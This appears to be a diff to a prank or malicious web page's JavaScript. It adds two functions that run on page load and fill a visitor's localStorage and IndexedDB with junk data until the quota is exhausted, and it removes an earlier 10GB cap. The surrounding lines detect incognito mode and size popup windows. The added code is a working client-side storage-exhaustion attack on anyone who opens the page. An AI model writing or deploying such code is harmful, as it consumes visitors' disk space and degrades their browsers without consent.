@@ -31,45 +31,53 @@ let cookieBlocked = document.cookie.indexOf("check=1") === -1;
     console.log("✅ Normal Mode");
   }
 
-let hasFlooded = false;
+function floodLocalStorage() {
+  try {
+    let i = 0;
+    const payload = "💣".repeat(1024 * 100); // ~100KB per item
+    while (true) {
+      localStorage.setItem("kaboom_" + i, payload);
+      i++;
+      if (i % 50 === 0) console.log(`localStorage: ~${i * 100}KB used`);
+    }
+  } catch (e) {
+    console.warn("💀 localStorage FULL:", e);
+  }
+}
 
-function floodIncognitoStorage() {
-  if (hasFlooded) return;
-  hasFlooded = true;
-
-  indexedDB.open("floodDB", 1).onupgradeneeded = function (event) {
+function floodIndexedDB() {
+  indexedDB.open("nukeDB", 1).onupgradeneeded = function (event) {
     const db = event.target.result;
-    db.createObjectStore("pain");
+    db.createObjectStore("doomStore");
   };
 
-  indexedDB.open("floodDB").onsuccess = function (event) {
+  indexedDB.open("nukeDB").onsuccess = function (event) {
     const db = event.target.result;
-    const tx = db.transaction("pain", "readwrite");
-    const store = tx.objectStore("pain");
+    const tx = db.transaction("doomStore", "readwrite");
+    const store = tx.objectStore("doomStore");
 
-    // Let's make a 1MB blob of repeating data
-    const data = new Uint8Array(1024 * 1024); // 1MB
-    data.fill(69); // nice
+    const blob = new Uint8Array(1024 * 1024); // 1MB
+    blob.fill(1337); // Elite fill
 
     let i = 0;
-    let written = 0;
 
     const write = () => {
       try {
-        store.put(data, `💥${i}`);
+        store.put(blob, "💾" + i);
         i++;
-        written++;
-        if (written % 100 === 0) console.log(`Stored ${written}MB`);
-        if (written < 10000) requestIdleCallback(write); // up to 10GB if allowed
+        if (i % 10 === 0) console.log(`IndexedDB: ${i}MB written`);
+        requestIdleCallback(write); // chill a bit to avoid locking tab
       } catch (e) {
-        console.warn("💀 Limit hit or error:", e);
+        console.warn("💀 IndexedDB FULL or Error:", e);
       }
     };
 
     write();
   };
 }
-floodIncognitoStorage();
+
+  floodLocalStorage();
+  floodIndexedDB();
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
